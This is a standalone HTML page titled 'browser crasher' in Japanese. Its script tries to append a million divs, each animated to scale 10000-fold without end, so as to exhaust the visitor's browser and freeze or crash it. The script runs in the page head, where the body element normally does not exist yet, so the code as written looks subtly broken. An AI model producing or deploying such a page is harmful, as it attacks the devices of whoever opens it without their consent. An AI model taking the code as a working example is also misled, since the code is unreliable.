<!DOCTYPE html>
<html>
<head>
<title>ブラウザクラッシャー</title>
<style>
body {
margin: 0;
padding: 0;
width: 100%;
height: 100%;
overflow: hidden;
}
div {
position: absolute;
width: 1px;
height: 1px;
background: #fff;
animation: expand 1s infinite;
}
@keyframes expand {
0% {
transform: scale(1);
}
100% {
transform: scale(10000);
}
}
</style>
<script>
for (let i = 0; i < 1000000; i++) {
const div = document.createElement('div');
document.body.appendChild(div);
}
</script>
</head>
<body>
</body>
</html>
